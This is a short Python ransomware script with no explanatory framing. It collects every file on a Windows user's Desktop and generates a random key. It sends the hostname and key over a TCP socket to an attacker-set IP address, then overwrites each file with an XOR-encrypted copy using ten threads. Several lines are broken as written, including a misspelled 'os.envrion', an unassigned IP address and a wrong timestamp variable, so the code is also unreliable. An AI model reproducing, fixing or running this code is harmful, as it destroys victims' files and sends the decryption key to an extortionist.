import queue
import socket
import os
from threading import Thread
from queue import Queue
import random
from datetime import datetime, time
import threading

def encrypt(key):
    while True:
        file=q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file,'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))

                #increment key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} successfully encrypted')
        except:
            print('Failed to encrypt file :(')
        q.task_done()



#encryption information
ENCRYPTION_LEVEL = 512 // 8   #512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_char_pool_len = len(key_char_pool)

#grab filepaths to encrypt
print("Preparing files......")
desktop_path = os.envrion['USERPROFILE']+'\\Desktop'
files= os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("successfully located all the files!")

#grab clients hostname
hostname = os.getenv('COMPUTERNAME')


#GENERATE ENCRYPTION KEY
print("Generating encryption key......")
key =''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print("Key Generated!!!")


#connect to server to transfer key and hostname
ip_address = #here enter you wifi lan adapter ip address like this: '23.23.23.23'
port = 5678
tim = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM)as s:
    s.connect((ip_address,port))
    print('Successfully connected.... transmitting hostaname and key')
    s.send(f'[{time}] - {hostname}:{key}' .encode('utf-8'))
    print('Finished transmitting data!')
    s.close()

#store files into a queue for threads to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)


#setup threads to get ready for encryption ;)
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()


q.join()
print('Encryption and upload complete!!! :)')
input()
            
    
